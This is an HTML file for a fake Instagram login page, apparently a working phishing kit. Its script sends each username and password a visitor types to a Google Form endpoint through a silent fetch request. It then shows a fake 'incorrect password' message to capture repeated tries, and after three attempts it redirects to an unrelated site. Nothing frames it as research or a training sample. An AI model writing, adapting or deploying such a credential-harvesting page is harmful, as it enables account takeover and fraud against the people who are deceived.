<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <style>
    body {
      margin: 0;
      background: #000;
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #121212;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
      width: 90%;
      max-width: 350px;
    }
    .logo {
      text-align: center;
      font-size: 2em;
      margin-bottom: 20px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #333;
      border-radius: 4px;
      background: #262626;
      color: #fff;
      font-size: 14px;
    }
    input::placeholder {
      color: #999;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      font-size: 14px;
    }
    .error {
      display: none;
      color: #ed4956;
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Log In</button>
      <div class="error" id="errorMessage">Sorry, your password was incorrect. Please try again.</div>
    </form>
  </div>

  <script>
    let attempts = 0;
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Google Form URL
      const formURL = 'https://docs.google.com/forms/d/e/1FAIpQLScnSfzdacC7G8vS-VJ2fPTsyz27j5TsXDYDhQaoVKvPym0wpw/formResponse';
      const formData = new FormData();
      formData.append('entry.1854468290', username); // username field
      formData.append('entry.1140100791', password); // password field

      // Send silently to Google Form
      fetch(formURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      });

      // Increment failed attempts
      attempts++;

      if (attempts > 2) {
        // Redirect after 2 failed attempts
        window.location.href = "https://yce.perfectcorp.com/ai-makeup";
      } else {
        // Show fake error message
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('password').value = '';
      }
    });
  </script>
</body>
</html>
